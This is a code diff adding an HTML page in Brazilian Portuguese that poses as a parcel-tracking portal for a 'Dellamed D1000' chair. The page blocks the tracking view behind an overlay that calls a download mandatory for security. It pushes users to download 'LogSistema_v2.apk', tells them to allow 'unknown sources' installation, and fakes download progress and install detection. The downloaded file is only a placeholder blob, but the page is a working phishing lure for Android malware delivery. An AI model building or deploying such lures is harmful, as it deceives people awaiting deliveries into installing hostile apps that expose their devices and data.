@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Rastreio - Dellamed D1000</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; overflow: hidden; }
+        
+        .blur-content {
+            filter: blur(12px);
+            pointer-events: none;
+            user-select: none;
+        }
+
+        #mandatoryOverlay {
+            backdrop-filter: blur(6px);
+        }
+
+        @keyframes pulse-blue {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.7); }
+            50% { transform: scale(1.02); box-shadow: 0 0 20px 10px rgba(37, 99, 235, 0); }
+        }
+        .btn-download-now {
+            animation: pulse-blue 2s infinite;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-800">
+
+    <!-- Bloqueio Obrigatório -->
+    <div id="mandatoryOverlay" class="fixed inset-0 z-[200] bg-white/90 flex items-center justify-center p-4">
+        <div id="installerCard" class="bg-white rounded-3xl max-w-md w-full p-8 shadow-[0_25px_60px_rgba(0,0,0,0.15)] border border-gray-100 text-center">
+            
+            <!-- Estado 1: Início -->
+            <div id="stateInitial">
+                <div class="mb-6">
+                    <div class="w-20 h-20 bg-blue-600 rounded-3xl flex items-center justify-center text-white text-4xl mx-auto shadow-lg shadow-blue-200">
+                        <i class="fas fa-file-arrow-down"></i>
+                    </div>
+                </div>
+                <h2 class="text-2xl font-black text-gray-900 mb-3">Download Obrigatório</h2>
+                <p class="text-gray-600 mb-8 text-sm leading-relaxed">
+                    Por motivos de segurança e conferência da <strong>Cadeira Dellamed D1000</strong>, o rastreio detalhado só é liberado através do nosso assistente de entrega.
+                </p>
+                
+                <div class="space-y-4">
+                    <button onclick="iniciarFluxoDownload()" class="btn-download-now w-full bg-blue-600 text-white py-4 rounded-2xl font-bold text-lg shadow-xl shadow-blue-200 hover:bg-blue-700 transition-all flex items-center justify-center gap-3">
+                        <i class="fas fa-download"></i>
+                        Baixar e Instalar agora
+                    </button>
+                    <div class="flex items-center justify-center gap-2 text-gray-400">
+                        <i class="fas fa-shield-check text-xs"></i>
+                        <span class="text-[10px] uppercase font-bold tracking-widest">Arquivo Seguro: LogSistema_v2.apk</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Estado 2: Baixando -->
+            <div id="stateProgress" class="hidden space-y-6">
+                <div class="w-16 h-16 border-4 border-blue-100 border-t-blue-600 rounded-full animate-spin mx-auto"></div>
+                <div>
+                    <h3 class="text-xl font-bold text-gray-900">Baixando arquivo...</h3>
+                    <p class="text-gray-500 text-sm mt-1">Aguarde o término do download direto.</p>
+                </div>
+                <div class="w-full bg-gray-100 h-3 rounded-full overflow-hidden">
+                    <div id="progressBar" class="bg-blue-600 h-full w-0 transition-all duration-300"></div>
+                </div>
+                <p id="progressPercent" class="text-blue-600 font-bold text-sm">0%</p>
+            </div>
+
+            <!-- Estado 3: Instrução de Instalação -->
+            <div id="stateInstall" class="hidden text-left">
+                <div class="flex items-center gap-3 mb-6 bg-green-50 p-4 rounded-2xl">
+                    <i class="fas fa-circle-check text-green-500 text-2xl"></i>
+                    <div>
+                        <p class="text-sm font-bold text-green-800">Download Concluído!</p>
+                        <p class="text-[11px] text-green-600">LogSistema_v2.apk (64.2 MB)</p>
+                    </div>
+                </div>
+                
+                <h3 class="text-lg font-bold text-gray-900 mb-4">Como liberar o rastreio:</h3>
+                
+                <div class="space-y-4 mb-8">
+                    <div class="flex gap-4">
+                        <div class="bg-gray-100 w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-sm">1</div>
+                        <p class="text-sm text-gray-600">Clique no arquivo baixado na sua barra de notificações.</p>
+                    </div>
+                    <div class="flex gap-4">
+                        <div class="bg-gray-100 w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-sm">2</div>
+                        <p class="text-sm text-gray-600">Se solicitado, autorize a instalação de "Fontes Desconhecidas".</p>
+                    </div>
+                    <div class="flex gap-4">
+                        <div class="bg-gray-100 w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 font-bold text-sm">3</div>
+                        <p class="text-sm text-gray-600">Abra o app para confirmar o recebimento da <strong>D1000</strong>.</p>
+                    </div>
+                </div>
+
+                <button onclick="liberarManual()" class="w-full bg-gray-900 text-white py-4 rounded-2xl font-bold hover:bg-black transition-all flex items-center justify-center gap-2">
+                    <i class="fas fa-check"></i>
+                    Já iniciei a instalação
+                </button>
+                <p class="text-center text-[10px] text-gray-400 mt-4 italic">O sistema irá detectar a instalação em instantes...</p>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Conteúdo do Site (Fundo) -->
+    <div id="mainContent" class="blur-content">
+        <header class="bg-white border-b border-gray-200 p-4">
+            <div class="max-w-5xl mx-auto flex justify-between items-center">
+                <div class="font-bold text-xl">LOG<span class="text-blue-600">SISTEMA</span></div>
+                <div class="text-xs text-gray-400">#DLM-9928341</div>
+            </div>
+        </header>
+        <main class="max-w-5xl mx-auto p-4 mt-8 space-y-6">
+            <div class="h-32 bg-white rounded-2xl border border-gray-200"></div>
+            <div class="h-64 bg-white rounded-2xl border border-gray-200"></div>
+            <div class="h-48 bg-white rounded-2xl border border-gray-200"></div>
+        </main>
+    </div>
+
+    <script>
+        function iniciarFluxoDownload() {
+            document.getElementById('stateInitial').classList.add('hidden');
+            document.getElementById('stateProgress').classList.remove('hidden');
+            
+            const progress = document.getElementById('progressBar');
+            const percentText = document.getElementById('progressPercent');
+            let width = 0;
+            
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    
+                    // Dispara o download real de um arquivo (simulado como blob para funcionar no navegador)
+                    triggerRealDownload();
+                    
+                    setTimeout(() => {
+                        document.getElementById('stateProgress').classList.add('hidden');
+                        document.getElementById('stateInstall').classList.remove('hidden');
+                    }, 500);
+                } else {
+                    width += Math.random() * 12;
+                    if (width > 100) width = 100;
+                    progress.style.width = width + '%';
+                    percentText.innerText = Math.floor(width) + '%';
+                }
+            }, 300);
+        }
+
+        function triggerRealDownload() {
+            // Cria um link temporário para forçar o navegador a baixar o arquivo
+            const dummyContent = "Conteudo do instalador LogSistema";
+            const blob = new Blob([dummyContent], { type: 'application/vnd.android.package-archive' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = 'LogSistema_Rastreio_v2.apk';
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+
+        function liberarManual() {
+            // Função que simula que o usuário já instalou e agora pode ver o site
+            const modal = document.getElementById('mandatoryOverlay');
+            const content = document.getElementById('mainContent');
+            
+            modal.innerHTML = `
+                <div class="bg-white p-8 rounded-3xl text-center shadow-2xl animate-bounce">
+                    <i class="fas fa-spinner fa-spin text-4xl text-blue-600 mb-4"></i>
+                    <p class="font-bold">Sincronizando com o App...</p>
+                </div>
+            `;
+            
+            setTimeout(() => {
+                document.getElementById('mandatoryOverlay').classList.add('hidden');
+                document.getElementById('mainContent').classList.remove('blur-content');
+                document.body.style.overflow = 'auto';
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
